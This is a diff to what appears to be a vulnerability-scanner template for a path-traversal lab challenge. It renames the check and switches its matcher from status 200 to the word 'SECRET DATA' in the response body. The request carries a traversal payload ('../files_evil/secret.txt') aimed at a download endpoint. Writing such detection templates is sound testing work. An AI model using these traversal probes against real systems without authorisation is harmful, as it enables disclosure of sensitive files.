@@ -1,10 +1,10 @@
-id: ch2-file-path-validation
+id: ch2-sensitive-file-read
 
 info:
-  name: Insecure path validation allows file access
+  name: Sensitive file disclosure via insecure path validation
   author: vignesh
   severity: high
-  description: Path traversal possible due to unsafe prefix-based validation
+  description: Application allows reading files outside the intended directory, exposing sensitive content
 
 requests:
   - method: GET
@@ -12,6 +12,7 @@ requests:
       - "{{BaseURL}}/download?file=../files_evil/secret.txt"
 
     matchers:
-      - type: status
-        status:
-          - 200
+      - type: word
+        part: body
+        words:
+          - "SECRET DATA"
